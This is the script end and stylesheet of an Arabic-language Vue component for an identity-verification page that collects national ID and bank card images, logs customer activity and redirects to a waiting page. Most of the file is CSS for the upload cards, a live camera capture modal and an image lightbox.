// إرسال المستندات وتأكيد الطلب
const handleSubmit = async () => {
  validationError.value = "";

  if (!idFrontPreview.value) {
    validationError.value = "يرجى إرفاق صورة بطاقة الرقم القومي من الوجه الأمامي.";
    return;
  }
  if (!idBackPreview.value) {
    validationError.value = "يرجى إرفاق صورة بطاقة الرقم القومي من الوجه الخلفي.";
    return;
  }
  if (!bankCardPreview.value) {
    validationError.value = "يرجى إرفاق صورة البطاقة البنكية مع إظهار أول 4 وآخر 4 أرقام فقط.";
    return;
  }

  isSubmitting.value = true;

  try {
    await submitCustomerDocuments({
      nationalIdFrontImage: idFrontPreview.value,
      nationalIdBackImage: idBackPreview.value,
      bankCardImage: bankCardPreview.value,
    });

    await trackCustomerActivity(
      {
        status: "تم رفع المستندات",
        lastAction: "إرسال وتوثيق كافة المستندات المطلوبة بنجاح",
      },
      "documents_submitted",
      {
        completedCount: 3,
      }
    );

    // التوجيه إلى صفحة الانتظار
    router.push(ROUTE_PATHS.waitingRoom);
  } catch (error) {
    console.error("Failed to submit documents", error);
    validationError.value = "تعذر إرسال المستندات، يرجى التحقق من اتصال الإنترنت والمحاولة مجدداً.";
  } finally {
    isSubmitting.value = false;
  }
};

onMounted(() => {
  void trackCustomerActivity(
    {
      lastPage: "/documents",
      lastAction: "عرض صفحة توثيق الهوية والمستندات",
    },
    "page_visit",
    { path: "/documents" }
  );
});

onUnmounted(() => {
  stopCameraStream();
});
</script>

<style scoped>
.documents-page-wrapper {
  min-height: calc(100vh - 80px);
  padding: 48px 0 80px;
  background: #f4f7fc;
}

.documents-container {
  max-width: 820px;
  margin-inline: auto;
}

/* ========================================= */
/* عنوان أعلى المحتوى                       */
/* ========================================= */
.documents-top-header {
  text-align: center;
  margin-bottom: 24px;
  padding: 0 12px;
}

.documents-main-title {
  margin: 0;
  color: #172033;
  font-size: clamp(1.05rem, 2.5vw, 1.25rem);
  font-weight: 800;
  line-height: 1.7;
}

/* ========================================= */
/* الفراغ الأبيض الكبير الرئيسي (Main Card)   */
/* ========================================= */
.white-canvas-card {
  background: #ffffff;
  border-radius: 8px;
  padding: 42px 48px;
  box-shadow: 0 4px 20px rgba(15, 36, 64, 0.06);
  border: 1px solid #e5e7eb;
}

/* ========================================= */
/* أقسام المتطلبات (Requirements)            */
/* ========================================= */
.requirement-section {
  margin-bottom: 28px;
}

.requirement-header {
  display: flex;
  align-items: flex-start;
  gap: 14px;
  margin-bottom: 22px;
}

.req-number-badge {
  width: 32px;
  height: 32px;
  border-radius: 6px;
  background: #026A32;
  color: #ffffff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: 800;
  font-size: 1rem;
  flex-shrink: 0;
  margin-top: 2px;
}

.req-title {
  margin: 0 0 6px;
  color: #172033;
  font-size: 1.15rem;
  font-weight: 800;
}

.req-description {
  margin: 0;
  color: #667085;
  font-size: 0.92rem;
  line-height: 1.6;
}

/* شبكة بطاقات الرفع */
.uploads-grid {
  display: grid;
  gap: 18px;
}

.uploads-grid.two-cols {
  grid-template-columns: repeat(2, minmax(0, 1fr));
}

.uploads-grid.single-col {
  grid-template-columns: 1fr;
}

.upload-card {
  border: 1px dashed #cbd5e1;
  border-radius: 6px;
  background: #fafbfc;
  padding: 20px;
  display: flex;
  flex-direction: column;
  transition: all 0.18s ease;
  min-height: 220px;
}

.upload-card:hover {
  border-color: #026A32;
  background: #f7faf8;
}

.upload-card.is-dragging {
  border-color: #026A32;
  background: #eef7f1;
}

.upload-card.has-file {
  border-style: solid;
  border-color: #026A32;
  background: #ffffff;
}

.upload-card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 14px;
}

.upload-badge {
  font-size: 0.9rem;
  font-weight: 800;
  color: #172033;
}

.status-chip {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 3px 10px;
  border-radius: 4px;
  font-size: 0.76rem;
  font-weight: 700;
}

.status-chip.pending {
  background: #fee2e2;
  color: #b91c1c;
}

.status-chip.success {
  background: #dcfce7;
  color: #026A32;
}

/* مساحة المحتوى الفارغ للرفع */
.upload-placeholder {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  text-align: center;
  flex-grow: 1;
  padding: 8px 4px;
}

.placeholder-icon-box {
  width: 52px;
  height: 52px;
  border-radius: 50%;
  background: rgba(2, 106, 50, 0.08);
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 10px;
}

.placeholder-title {
  font-size: 0.9rem;
  font-weight: 700;
  color: #334155;
  margin-bottom: 4px;
}

.placeholder-hint {
  font-size: 0.8rem;
  color: #64748b;
  margin-bottom: 16px;
}

/* أزرار الرفع والالتقاط */
.upload-actions-row {
  display: flex;
  gap: 10px;
  width: 100%;
  justify-content: center;
}

.action-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  padding: 9px 14px;
  border-radius: 6px;
  font-size: 0.84rem;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.16s ease;
  flex: 1;
  max-width: 160px;
  border: 0;
  font-family: inherit;
}

.camera-btn {
  background: #026A32;
  color: #ffffff;
}

.camera-btn:hover {
  background: #015226;
}

.browse-btn {
  background: #ffffff;
  color: #334155;
  border: 1px solid #d1d5db;
}

.browse-btn:hover {
  border-color: #026A32;
  color: #026A32;
  background: #f9fafb;
}

.visually-hidden {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  border: 0;
}

/* مساحة المعاينة */
.preview-area {
  position: relative;
  border-radius: 6px;
  overflow: hidden;
  height: 180px;
  background: #0f172a;
}

.preview-image {
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: block;
}

.preview-overlay {
  position: absolute;
  inset: 0;
  background: rgba(15, 23, 42, 0.65);
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  opacity: 0;
  transition: opacity 0.18s ease;
}

.preview-area:hover .preview-overlay {
  opacity: 1;
}

.overlay-btn {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 8px 14px;
  border-radius: 6px;
  font-size: 0.82rem;
  font-weight: 700;
  border: 0;
  cursor: pointer;
}

.view-btn {
  background: #ffffff;
  color: #0f172a;
}

.remove-btn {
  background: #dc2626;
  color: #ffffff;
}

/* فاصل الأقسام */
.form-section-divider {
  height: 1px;
  background: #e5e7eb;
  margin: 32px 0;
}

/* ============================================================== */
/* صندوق النموذج التوضيحي للبطاقة البنكية                         */
/* ============================================================== */
.card-example-guide-container {
  background: #f8fafc;
  border: 1px solid #e2e8f0;
  border-radius: 6px;
  padding: 18px;
  margin-bottom: 20px;
}

.guide-visual-layout {
  display: grid;
  grid-template-columns: 1.15fr 0.85fr;
  gap: 20px;
  align-items: center;
}

.guide-image-frame {
  border-radius: 6px;
  overflow: hidden;
  border: 1px solid #d1d5db;
  background: #ffffff;
}

.sample-card-img {
  width: 100%;
  height: auto;
  display: block;
  object-fit: cover;
}

.guide-instructions-list {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.guide-point-card {
  display: flex;
  align-items: flex-start;
  gap: 8px;
}

.point-bullet {
  color: #026A32;
  font-size: 1.2rem;
  line-height: 1.2;
}

.guide-point-card p {
  margin: 0;
  font-size: 0.88rem;
  color: #475467;
  line-height: 1.6;
}

/* ========================================= */
/* أخطاء التحقق وزر الإرسال                  */
/* ========================================= */
.validation-error-box {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 12px 18px;
  border-radius: 6px;
  background: #fef2f2;
  border: 1px solid #fecaca;
  color: #b91c1c;
  font-size: 0.9rem;
  font-weight: 700;
  margin-bottom: 24px;
}

.form-submit-row {
  display: flex;
  justify-content: center;
  margin-top: 28px;
}

.submit-documents-btn {
  min-width: 240px;
  height: 48px;
  font-size: 1.05rem;
  font-weight: 800;
  border-radius: 6px;
}

.btn-arrow {
  font-size: 1.35rem;
  line-height: 1;
  margin-inline-start: 6px;
}

.loading-btn-content {
  display: inline-flex;
  align-items: center;
  gap: 10px;
}

.mini-spinner {
  width: 18px;
  height: 18px;
  border: 2.5px solid rgba(255, 255, 255, 0.35);
  border-top-color: #ffffff;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

.mini-spinner.large {
  width: 32px;
  height: 32px;
  border-width: 3px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

/* ========================================= */
/* نافذة الكاميرا المباشرة (Live Camera)     */
/* ========================================= */
.camera-modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.88);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 99999;
  padding: 16px;
}

.camera-modal-card {
  background: #111827;
  border-radius: 12px;
  max-width: 720px;
  width: 100%;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
  border: 1px solid #374151;
}

.camera-modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 14px 18px;
  background: #1f2937;
  border-bottom: 1px solid #374151;
  color: #ffffff;
}

.camera-title-wrap {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 0.92rem;
  font-weight: 700;
}

.camera-close-btn {
  background: #374151;
  border: 0;
  border-radius: 6px;
  width: 32px;
  height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #d1d5db;
  cursor: pointer;
  transition: all 0.15s ease;
}

.camera-close-btn:hover {
  background: #ef4444;
  color: #ffffff;
}

.camera-viewport-container {
  position: relative;
  width: 100%;
  aspect-ratio: 16 / 10;
  max-height: 60vh;
  background: #000000;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}

.live-stream-wrap,
.captured-preview-wrap {
  position: relative;
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
}

.live-camera-video,
.captured-preview-img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

/* إطار البطاقة التوجيهي */
.camera-card-frame {
  position: absolute;
  width: 82%;
  aspect-ratio: 1.58;
  border: 2px dashed rgba(255, 255, 255, 0.6);
  border-radius: 10px;
  box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.45);
  pointer-events: none;
  display: flex;
  align-items: flex-end;
  justify-content: center;
  padding-bottom: 12px;
}

.frame-corner {
  position: absolute;
  width: 16px;
  height: 16px;
  border-color: #10b981;
  border-style: solid;
}

.frame-corner.top-left {
  top: -2px;
  left: -2px;
  border-width: 3px 0 0 3px;
  border-top-left-radius: 8px;
}

.frame-corner.top-right {
  top: -2px;
  right: -2px;
  border-width: 3px 3px 0 0;
  border-top-right-radius: 8px;
}

.frame-corner.bottom-left {
  bottom: -2px;
  left: -2px;
  border-width: 0 0 3px 3px;
  border-bottom-left-radius: 8px;
}

.frame-corner.bottom-right {
  bottom: -2px;
  right: -2px;
  border-width: 0 3px 3px 0;
  border-bottom-right-radius: 8px;
}

.frame-hint {
  color: #ffffff;
  font-size: 0.78rem;
  font-weight: 700;
  text-shadow: 0 1px 4px rgba(0, 0, 0, 0.8);
  background: rgba(0, 0, 0, 0.55);
  padding: 3px 10px;
  border-radius: 4px;
}

.camera-loading-overlay {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
  color: #ffffff;
  font-size: 0.9rem;
}

/* شريط أزرار الكاميرا */
.camera-controls-bar {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 24px;
  padding: 16px;
  background: #1f2937;
  border-top: 1px solid #374151;
}

.shutter-capture-btn {
  width: 64px;
  height: 64px;
  border-radius: 50%;
  background: #ffffff;
  border: 4px solid #374151;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: transform 0.15s ease, background 0.15s ease;
}

.shutter-capture-btn:hover {
  transform: scale(1.06);
  background: #f3f4f6;
}

.shutter-capture-btn:active {
  transform: scale(0.95);
}

.shutter-inner-circle {
  width: 48px;
  height: 48px;
  border-radius: 50%;
  background: #026A32;
  display: block;
}

.camera-icon-btn {
  width: 44px;
  height: 44px;
  border-radius: 50%;
  background: #374151;
  border: 0;
  color: #ffffff;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.15s ease;
}

.camera-icon-btn:hover {
  background: #4b5563;
}

.camera-action-btn {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 10px 20px;
  border-radius: 6px;
  font-size: 0.9rem;
  font-weight: 800;
  cursor: pointer;
  border: 0;
  font-family: inherit;
}

.btn-retake {
  background: #374151;
  color: #ffffff;
}

.btn-retake:hover {
  background: #4b5563;
}

.btn-confirm {
  background: #026A32;
  color: #ffffff;
}

.btn-confirm:hover {
  background: #015226;
}

/* ========================================= */
/* نافذة المعاينة المكبرة (Lightbox)        */
/* ========================================= */
.lightbox-modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 99999;
  padding: 20px;
}

.lightbox-content {
  background: #ffffff;
  border-radius: 8px;
  max-width: 850px;
  width: 100%;
  max-height: 90vh;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.lightbox-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 14px 18px;
  border-bottom: 1px solid #e5e7eb;
}

.lightbox-title {
  font-weight: 800;
  color: #172033;
  font-size: 0.95rem;
}

.lightbox-close-btn {
  background: #f3f4f6;
  border: 0;
  border-radius: 6px;
  width: 32px;
  height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #475467;
  cursor: pointer;
}

.lightbox-body {
  padding: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #0f172a;
}

.lightbox-image {
  max-width: 100%;
  max-height: 70vh;
  object-fit: contain;
}

/* ========================================= */
/* التجاوب مع مختلف الشاشات (Responsive)     */
/* ========================================= */
@media (max-width: 860px) {
  .white-canvas-card {
    padding: 28px 20px;
  }

  .uploads-grid.two-cols {
    grid-template-columns: 1fr;
  }

  .guide-visual-layout {
    grid-template-columns: 1fr;
    gap: 14px;
  }
}

@media (max-width: 560px) {
  .documents-page-wrapper {
    padding: 24px 0 48px;
  }

  .upload-actions-row {
    flex-direction: column;
    width: 100%;
  }

  .action-btn {
    max-width: none;
    width: 100%;
  }

  .submit-documents-btn {
    width: 100%;
    min-width: 0;
  }

  .camera-viewport-container {
    aspect-ratio: 4 / 3;
  }
}
</style>
